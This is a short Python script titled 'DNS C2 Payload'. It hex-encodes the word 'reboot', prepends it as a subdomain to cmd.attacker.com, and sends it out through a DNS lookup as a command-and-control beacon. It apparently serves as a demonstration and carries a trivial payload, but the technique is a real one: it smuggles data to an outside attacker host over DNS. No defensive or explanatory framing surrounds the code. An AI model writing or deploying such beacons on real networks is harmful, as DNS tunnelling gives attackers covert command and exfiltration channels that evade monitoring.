# DNS C2 Payload
import socket

print(" Launching DNS C2 beacon...")
domain = "cmd.attacker.com"
command = "reboot"
encoded = command.encode("utf-8").hex()

fqdn = f"{encoded}.{domain}"
print(f"Sending DNS query to: {fqdn}")
try:
    socket.gethostbyname(fqdn)
    print("DNS beacon sent successfully.")
except Exception as e:
    print(f"DNS beacon failed: {e}")
